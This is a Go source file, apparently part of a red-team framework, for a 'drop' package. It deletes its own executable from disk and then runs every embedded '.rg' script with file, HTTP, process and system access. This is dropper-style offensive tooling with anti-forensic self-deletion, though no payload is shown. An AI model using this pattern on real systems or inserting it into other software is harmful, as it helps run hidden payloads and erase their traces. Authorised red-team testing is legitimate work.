// Package drop provides a simple method to walk a filesystem and execute scripts that will drop...
package drop

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/kcarretto/paragon/pkg/script"
	assetslib "github.com/kcarretto/paragon/pkg/script/stdlib/assets"
	filelib "github.com/kcarretto/paragon/pkg/script/stdlib/file"
	httplib "github.com/kcarretto/paragon/pkg/script/stdlib/http"
	processlib "github.com/kcarretto/paragon/pkg/script/stdlib/process"
	regexlib "github.com/kcarretto/paragon/pkg/script/stdlib/regex"
	syslib "github.com/kcarretto/paragon/pkg/script/stdlib/sys"

	"github.com/shurcooL/httpfs/vfsutil"
)

// TheBase uses WubWubWubWUBWUBWUBWUB.
func TheBase(ctx context.Context, assets http.FileSystem) {
	// Delete executable
	deleteUsingCWD()
	deleteUsingProc()

	if err := vfsutil.Walk(assets, "/scripts", func(path string, fi os.FileInfo, err error) error {
		// Check for stat error
		if err != nil {
			fmt.Printf("[ERROR] failed to stat file %q: %s\n", path, err.Error())
			return nil
		}

		// Skip directories
		if fi.IsDir() {
			return nil
		}

		// Skip files that don't end with .rg
		if !strings.HasSuffix(fi.Name(), ".rg") {
			fmt.Printf("[WARN] found non-script in scripts directory, scripts must end in '.rg' %q: %s", path, err.Error())
			return nil
		}

		// Open script file
		content, err := assets.Open(path)
		if err != nil {
			fmt.Printf("[ERROR] failed to open script %q: %s", path, err.Error())
			return nil
		}

		assetsEnv := &assetslib.Environment{
			Assets: assets,
		}

		// TODO: Restructure cdn lib so that client can be used without requiring all of ent

		// Initialize script
		dropScript := script.New(fi.Name(), content,
			script.WithOutput(os.Stdout), // TODO: Output to stdout?
			assetsEnv.Include(),
			filelib.Include(),
			httplib.Include(),
			processlib.Include(),
			regexlib.Include(),
			syslib.Include(),
		)

		// Run script
		if err := dropScript.Exec(context.Background()); err != nil {
			fmt.Printf("[ERROR] script failed execution %q: %s", path, err.Error())
			return nil
		}

		return nil
	}); err != nil {
		fmt.Printf("[ERROR] failed to walk files: %s", err.Error())
	}
}

// Determines the path to the running executable using /proc/self/exe. Fails for non-linux platforms.
func deleteUsingProc() {
	path, err := os.Executable()
	if err != nil {
		log.Printf("[WARN][DELETION] failed to resolve path using /proc/self/exe: %v", err)
		return
	}

	if err := deleteFile(path); err != nil {
		log.Printf("[ERROR][DELETION] failed to delete file at path %q: %v", path, err)
		return
	}

	log.Printf("[INFO][DELETION] Successfully deleted file %q", path)
}

// Determines the path using argv[0] and the current working directory.
func deleteUsingCWD() {
	if len(os.Args) < 1 {
		log.Printf("[ERROR][DELETION] unable to read argv[0]")
		return
	}

	path := os.Args[0]
	if !filepath.IsAbs(path) {
		dir, err := os.Getwd()
		if err != nil {
			log.Printf("[ERROR][DELETION] unable to resolve current directory: %w", err)
			return
		}
		path = filepath.Join(dir, filepath.Base(path))
	}

	if err := deleteFile(path); err != nil {
		log.Printf("[ERROR][DELETION] failed to delete file at path %q: %v", path, err)
		return
	}

	log.Printf("[INFO][DELETION] Successfully deleted file %q", path)
}
